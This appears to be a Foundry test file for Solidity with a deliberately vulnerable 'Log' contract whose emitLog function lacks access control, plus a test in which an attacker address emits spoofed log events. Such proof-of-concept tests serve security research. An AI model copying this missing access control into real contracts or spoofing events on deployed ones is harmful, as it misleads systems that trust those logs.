pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica
contract Log {
    event LogEvent(address indexed contractAddr, address indexed caller, string logName, bytes data);

    // store last emitted values so tests can assert state change (original only emitted event)
    address public lastContract;
    address public lastCaller;
    string  public lastLogName;
    bytes   public lastData;

    // Vulnerable: no access control — anyone can call this to emit spoofed logs
    function emitLog(address _contract, address _caller, string calldata _logName, bytes calldata _data) public {
        emit LogEvent(_contract, _caller, _logName, _data);
        lastContract = _contract;
        lastCaller = _caller;
        lastLogName = _logName;
        lastData = _data;
    }
}

contract LogTest is Test {
    Log target;
    address attacker;

    function setUp() public {
        target = new Log();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_Log() public {
        vm.prank(attacker);
        target.emitLog(attacker, attacker, "spoofed-event", hex"deadbeef");

        // attacker successfully set spoofed log fields
        assertEq(target.lastCaller(), attacker);
        assertEq(target.lastContract(), attacker);
        assertEq(target.lastLogName(), "spoofed-event");
        assertEq(keccak256(target.lastData()), keccak256(hex"deadbeef"));
    }
}

